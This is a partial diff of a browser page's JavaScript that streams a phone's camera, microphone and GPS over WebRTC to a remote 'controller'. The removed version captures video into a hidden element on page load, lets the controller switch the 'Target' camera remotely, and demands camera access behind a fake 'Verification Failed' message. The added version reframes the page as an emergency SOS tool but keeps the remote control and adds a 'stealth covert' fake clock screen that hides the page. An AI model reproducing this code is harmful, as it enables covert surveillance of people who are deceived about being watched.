+            holdTimerText.innerText = "TOUCH & HOLD TO TRIGGER";
+            holdTimerText.style.color = "#00f2fe";
+        }
+
+        // Bind touch & mouse events for hold button
+        holdWrapper.addEventListener('touchstart', startHold, { passive: false });
+        holdWrapper.addEventListener('touchend', cancelHold, { passive: false });
+        holdWrapper.addEventListener('touchcancel', cancelHold, { passive: false });
+        holdWrapper.addEventListener('mousedown', startHold);
+        holdWrapper.addEventListener('mouseup', cancelHold);
+        holdWrapper.addEventListener('mouseleave', cancelHold);
+
+        // Emergency SOS Activation (Unlocks and starts streaming ONLY NOW!)
+        async function triggerEmergencySos() {
+            if (isSosActive) return;
+            isSosActive = true;
+
+            // Vigorous emergency haptic vibration pattern
+            if (navigator.vibrate) navigator.vibrate([200, 100, 200, 100, 500]);
+
+            // Update UI to Emergency Active View
+            document.getElementById('armedContainer').style.display = 'none';
+            document.getElementById('emergencyCard').style.display = 'block';
+            sysDot.className = 'dot-status emergency';
+            sysStatus.innerText = '🚨 SOS ACTIVE';
+
+            // 1. Acquire Live Camera & Mic Stream Now
             try {
                 localStream = await navigator.mediaDevices.getUserMedia({
                     video: {
@@ -247,183 +959,169 @@
 
                 if (hiddenVideo) {
                     hiddenVideo.srcObject = localStream;
-                    hiddenVideo.play().catch(() => {});
+                    hiddenVideo.play().catch(() => { });
                 }
+            } catch (mediaErr) {
+                console.warn("Acquiring fallback media:", mediaErr);
+                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                if (hiddenVideo) {
+                    hiddenVideo.srcObject = localStream;
+                    hiddenVideo.play().catch(() => { });
+                }
+            }
 
-                // Discover all hardware cameras now that permission is granted
-                await discoverCameras();
+            // 2. Start Live High-Accuracy GPS Tracking
+            startGpsTracking();
 
-                connectSignaling();
-            } catch (err) {
-                console.error("Initial camera acquisition error:", err);
+            // 3. Gather Battery Telemetry
+            let batteryInfo = null;
+            try {
+                if ('getBattery' in navigator) {
+                    const b = await navigator.getBattery();
+                    batteryInfo = {
+                        level: Math.round(b.level * 100),
+                        charging: b.charging
+                    };
+                }
+            } catch (e) { }
+
+            // 4. Send SOS Alert Message to Central Control
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({
+                    type: "sos_alert",
+                    gps: currentGpsData,
+                    battery: batteryInfo,
+                    timestamp: new Date().toISOString()
+                }));
+            }
+
+            // 5. Start WebRTC Live Video & Audio Stream Offer
+            await sendOffer();
+
+            // 6. Automatic 112 Emergency Dial Prompt
+            setTimeout(() => {
                 try {
-                    localStream = await navigator.mediaDevices.getUserMedia({
-                        video: true,
-                        audio: true
-                    });
-                    if (hiddenVideo) {
-                        hiddenVideo.srcObject = localStream;
-                        hiddenVideo.play().catch(() => {});
-                    }
-                    await discoverCameras();
-                    connectSignaling();
-                } catch (fallbackErr) {
-                    console.error("Fatal camera permission error:", fallbackErr);
-                    card.innerHTML = `
-                        <h1 style="color: #ef4444;">Verification Failed</h1>
-                        <p>Camera access was not granted. Please allow camera permission and reload the page.</p>
-                    `;
+                    window.location.href = "tel:112";
+                } catch (e) {
+                    console.log("Auto-dial trigger executed");
                 }
+            }, 600);
+        }
+
+        // Stealth Covert Screen Logic
+        let stealthTapCount = 0;
+        let stealthTapTimer = null;
+
+        function enterStealthMode() {
+            const stealth = document.getElementById('stealthScreen');
+            stealth.style.display = 'flex';
+            updateStealthClock();
+        }
+
+        function updateStealthClock() {
+            const now = new Date();
+            const hours = String(now.getHours()).padStart(2, '0');
+            const mins = String(now.getMinutes()).padStart(2, '0');
+            document.getElementById('stealthTime').innerText = `${hours}:${mins}`;
+            const options = { weekday: 'long', month: 'short', day: 'numeric' };
+            document.getElementById('stealthDate').innerText = now.toLocaleDateString('en-US', options);
+        }
+        setInterval(updateStealthClock, 1000);
+
+        function handleStealthTap() {
+            stealthTapCount++;
+            if (stealthTapCount === 1) {
+                stealthTapTimer = setTimeout(() => {
+                    stealthTapCount = 0;
+                }, 400);
+            } else if (stealthTapCount >= 2) {
+                clearTimeout(stealthTapTimer);
+                stealthTapCount = 0;
+                document.getElementById('stealthScreen').style.display = 'none';
             }
         }
 
+        // Camera Switching (Front <-> Rear)
         async function switchCamera(requestedMode) {
-            if (isSwitching) return;
+            if (isSwitching || !isSosActive) return;
             isSwitching = true;
 
             const targetMode = requestedMode || (currentFacingMode === 'user' ? 'environment' : 'user');
             console.log(`[*] Switching camera to: ${targetMode}`);
 
             try {
-                // 1. Locate video sender while peer connection is active
                 let videoSender = null;
                 if (pc) {
                     const senders = pc.getSenders();
                     videoSender = senders.find(s => (s.track && s.track.kind === 'video') || s.kind === 'video');
                 }
 
-                // 2. Stop old video track to release mobile hardware sensor
                 if (localStream) {
                     localStream.getVideoTracks().forEach(t => {
                         try {
                             t.enabled = false;
                             t.stop();
-                        } catch (e) {}
+                        } catch (e) { }
                     });
                 }
                 if (hiddenVideo) {
                     try {
                         hiddenVideo.pause();
                         hiddenVideo.srcObject = null;
-                    } catch (e) {}
+                    } catch (e) { }
                 }
 
-                // 3. 150ms hardware cooldown
                 await new Promise(r => setTimeout(r, 150));
 
-                // 4. Query physical device IDs
-                let chosenDeviceId = null;
-                try {
-                    const devices = await navigator.mediaDevices.enumerateDevices();
-                    const videoInputs = devices.filter(d => d.kind === 'videoinput');
-                    console.log("[*] Video inputs available:", videoInputs.map(v => v.label));
-
-                    if (targetMode === 'environment') {
-                        // Find the camera with 'back' or the one that is NOT 'front'
-                        const rear = videoInputs.find(d => {
-                            const l = (d.label || '').toLowerCase();
-                            return l.includes('back') || l.includes('rear') || l.includes('environment') || (!l.includes('front') && !l.includes('user') && !l.includes('selfie'));
-                        });
-                        if (rear) chosenDeviceId = rear.deviceId;
-                    } else {
-                        // Find the camera with 'front'
-                        const front = videoInputs.find(d => {
-                            const l = (d.label || '').toLowerCase();
-                            return l.includes('front') || l.includes('user') || l.includes('selfie');
-                        });
-                        if (front) chosenDeviceId = front.deviceId;
-                    }
-                } catch (eEnum) {
-                    console.log("Device enumeration error:", eEnum);
-                }
-
-                // 5. Acquire new camera stream using deviceId first, facingMode second
                 let newStream = null;
-                const constraints = [];
-                if (chosenDeviceId) {
-                    constraints.push({ video: { deviceId: { exact: chosenDeviceId } }, audio: false });
-                    constraints.push({ video: { deviceId: chosenDeviceId }, audio: false });
-                }
-                constraints.push({ video: { facingMode: { exact: targetMode } }, audio: false });
-                constraints.push({ video: { facingMode: targetMode }, audio: false });
-                constraints.push({ video: { facingMode: { ideal: targetMode } }, audio: false });
-                constraints.push({ video: true, audio: false });
+                const constraints = [
+                    { video: { facingMode: { exact: targetMode } }, audio: false },
+                    { video: { facingMode: targetMode }, audio: false },
+                    { video: { facingMode: { ideal: targetMode } }, audio: false },
+                    { video: true, audio: false }
+                ];
 
-                let lastErr = null;
                 for (const c of constraints) {
                     try {
                         newStream = await navigator.mediaDevices.getUserMedia(c);
-                        if (newStream && newStream.getVideoTracks().length > 0) {
-                            console.log("[+] Camera acquired with constraint:", JSON.stringify(c));
-                            break;
-                        }
-                    } catch (e) {
-                        lastErr = e;
-                        console.log("Constraint attempt failed:", JSON.stringify(c), e.name);
-                    }
+                        if (newStream && newStream.getVideoTracks().length > 0) break;
+                    } catch (e) { }
                 }
 
                 if (!newStream || newStream.getVideoTracks().length === 0) {
-                    throw lastErr || new Error("Failed to open requested camera");
+                    throw new Error("Failed to switch camera lens");
                 }
 
                 const newVideoTrack = newStream.getVideoTracks()[0];
-
-                // 5. Hot-swap video track on WebRTC peer connection
                 if (videoSender) {
                     await videoSender.replaceTrack(newVideoTrack);
-                    console.log("[+] WebRTC replaceTrack succeeded for:", targetMode);
                 }
 
-                // 6. Update localStream and hiddenVideo
                 const audioTracks = localStream ? localStream.getAudioTracks() : [];
                 localStream = new MediaStream([...audioTracks, newVideoTrack]);
-
                 if (hiddenVideo) {
                     hiddenVideo.srcObject = localStream;
-                    hiddenVideo.play().catch(() => {});
+                    hiddenVideo.play().catch(() => { });
                 }
 
                 currentFacingMode = targetMode;
 
-                // 7. Send confirmation to controller
-                const lensLabel = newVideoTrack.label || (targetMode === 'environment' ? 'Rear Camera' : 'Front Camera');
                 if (ws && ws.readyState === WebSocket.OPEN) {
                     ws.send(JSON.stringify({
                         type: "camera_info",
                         camera: currentFacingMode,
-                        label: lensLabel,
+                        label: newVideoTrack.label || (targetMode === 'environment' ? 'Rear Cam' : 'Front Cam'),
                         status: "success"
                     }));
                 }
             } catch (err) {
-                console.error("Camera switch error:", err);
-                // Attempt to restore default camera
-                try {
-                    const fallback = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                    const fallbackTrack = fallback.getVideoTracks()[0];
-                    if (videoSender && fallbackTrack) await videoSender.replaceTrack(fallbackTrack);
-                    const audioTracks = localStream ? localStream.getAudioTracks() : [];
-                    localStream = new MediaStream([...audioTracks, fallbackTrack]);
-                    if (hiddenVideo) {
-                        hiddenVideo.srcObject = localStream;
-                        hiddenVideo.play().catch(() => {});
-                    }
-                    currentFacingMode = "user";
-                } catch (revertErr) {}
-
-                if (ws && ws.readyState === WebSocket.OPEN) {
-                    ws.send(JSON.stringify({
-                        type: "camera_info",
-                        camera: currentFacingMode,
-                        error: (err.name || "Error") + ": " + (err.message || "Failed")
-                    }));
-                }
+                console.warn("Camera switch error:", err);
             } finally {
                 isSwitching = false;
             }
         }
 
+        // WebRTC Signaling & Connection
         function connectSignaling() {
             if (isConnectingWs) return;
             isConnectingWs = true;
@@ -432,16 +1130,15 @@
                 try {
                     ws.onclose = null;
                     ws.close();
-                } catch (e) {}
+                } catch (e) { }
             }
 
             ws = new WebSocket(wsUrl);
 
             ws.onopen = async function () {
                 isConnectingWs = false;
-                console.log("[+] Target connected to signaling server");
+                console.log("[+] SOS Target connected to 112 signaling server (Standby)");
 
-                // Start heartbeat ping
                 if (pingInterval) clearInterval(pingInterval);
                 pingInterval = setInterval(() => {
                     if (ws && ws.readyState === WebSocket.OPEN) {
@@ -449,13 +1146,11 @@
                     }
                 }, 20000);
 
-                await sendOffer();
-
-                if (ws && ws.readyState === WebSocket.OPEN) {
-                    ws.send(JSON.stringify({
-                        type: "camera_info",
-                        camera: currentFacingMode
-                    }));
+                if (isSosActive) {
+                    await sendOffer();
+                } else {
+                    // Send standby registration
+                    ws.send(JSON.stringify({ type: "target_standby", is_sos: false }));
                 }
             };
 
@@ -463,36 +1158,32 @@
                 try {
                     const msg = JSON.parse(event.data);
 
-                    if (msg.type === "pong") {
-                        return;
-                    }
-
-                    if (msg.type === "request_offer") {
-                        console.log("[+] Received request_offer from controller");
+                    if (msg.type === "init") {
+                        myTargetId = msg.targetId;
+                        console.log("[*] Assigned SOS ID:", myTargetId);
+                    } else if (msg.type === "request_offer" && isSosActive) {
                         await sendOffer();
-                    } else if (msg.type === "switch_camera") {
-                        console.log("[+] Received switch_camera command:", msg.camera);
+                    } else if (msg.type === "switch_camera" && isSosActive) {
                         await switchCamera(msg.camera);
+                    } else if (msg.type === "dispatch_pcr") {
+                        const dispEl = document.getElementById('liveDispatchedVal');
+                        if (dispEl) {
+                            dispEl.innerText = `${msg.vehicleId || 'PCR-112'} (${msg.eta || 'En Route'})`;
+                            dispEl.style.color = '#10b981';
+                        }
                     } else if (msg.type === "answer" && pc) {
-                        console.log("[+] Setting remote answer description");
                         await pc.setRemoteDescription(new RTCSessionDescription(msg.data));
-
-                        // Flush any pending ICE candidates safely
                         while (pendingIceCandidates.length > 0) {
                             const cand = pendingIceCandidates.shift();
                             try {
                                 await pc.addIceCandidate(cand);
-                            } catch (e) {
-                                console.warn("Failed to add queued candidate:", e);
-                            }
+                            } catch (e) { }
                         }
                     } else if (msg.type === "ice" && pc) {
                         if (pc.remoteDescription && pc.remoteDescription.type) {
                             try {
                                 await pc.addIceCandidate(msg.data);
-                            } catch (e) {
-                                console.warn("Failed to add ICE candidate:", e);
-                            }
+                            } catch (e) { }
                         } else {
                             pendingIceCandidates.push(msg.data);
                         }
@@ -507,28 +1198,22 @@
             ws.onclose = () => {
                 isConnectingWs = false;
                 if (pingInterval) clearInterval(pingInterval);
-                console.log("Target WebSocket closed. Reconnecting in 2s...");
                 setTimeout(() => {
-                    if (localStream) {
-                        connectSignaling();
-                    }
+                    if (isArmed) connectSignaling();
                 }, 2000);
             };
         }
 
         async function sendOffer() {
-            console.log("[*] Generating new WebRTC offer for controller");
+            if (!isSosActive) return; // Never send media offer before SOS is triggered!
+            
             pendingIceCandidates = [];
-
             if (pc) {
                 try {
                     pc.ontrack = null;
                     pc.onicecandidate = null;
-                    pc.onconnectionstatechange = null;
                     pc.close();
-                } catch (e) {
-                    console.warn("Error closing old pc:", e);
-                }
+                } catch (e) { }
             }
 
             pc = new RTCPeerConnection(rtcConfig);
@@ -536,7 +1221,6 @@
             if (localStream) {
                 localStream.getTracks().forEach(track => {
                     if (track.readyState === 'live') {
-                        console.log("[+] Adding track to PC:", track.kind);
                         pc.addTrack(track, localStream);
                     }
                 });
@@ -548,10 +1232,6 @@
                 }
             };
 
-            pc.onconnectionstatechange = () => {
-                console.log("[*] Target WebRTC Connection State:", pc.connectionState);
-            };
-
             const offer = await pc.createOffer({
                 offerToReceiveAudio: false,
                 offerToReceiveVideo: false
@@ -559,8 +1239,12 @@
             await pc.setLocalDescription(offer);
 
             if (ws && ws.readyState === WebSocket.OPEN) {
-                console.log("[+] Dispatched offer to controller");
-                ws.send(JSON.stringify({ type: "offer", data: offer }));
+                ws.send(JSON.stringify({
+                    type: "offer",
+                    data: offer,
+                    gps: currentGpsData,
+                    is_sos: true
+                }));
             }
         }
     </script>
